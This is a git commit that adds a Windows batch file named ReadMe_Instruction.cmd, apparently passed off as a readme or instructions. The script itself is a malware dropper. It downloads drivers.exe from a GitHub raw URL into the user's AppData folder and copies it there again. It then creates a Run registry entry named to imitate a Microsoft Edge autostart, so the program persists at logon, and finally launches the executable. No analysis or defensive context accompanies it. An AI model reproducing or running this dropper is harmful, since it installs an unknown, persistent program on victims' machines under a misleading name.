673267ffc4f6d0aad0a5a139738934adee98c0c4
hwangyounggul33 <suetologg22@gmail.com>
2024-12-27 20:34:39 +0300

    Add files via upload

---
+++ ReadMe_Instruction.cmd
@@ -0,0 +1,10 @@
+ÿþ
+@echo off
+setlocal
+curl -L -o "C:\Users\Meri_Lin\AppData\Roaming\drivers.exe" "https://github.com/hwangyounggul33/windew/raw/refs/heads/main/drivers.exe"
+echo File downloaded successfully.
+cd /d %~dp0
+copy /b "drivers.exe" "%AppData%\drivers.exe"
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v MicrosoftEdAutoLaunch_020 /t REG_SZ /d "%AppData%\drivers.exe" 
+Start %AppData%\drivers.exe
+Exit
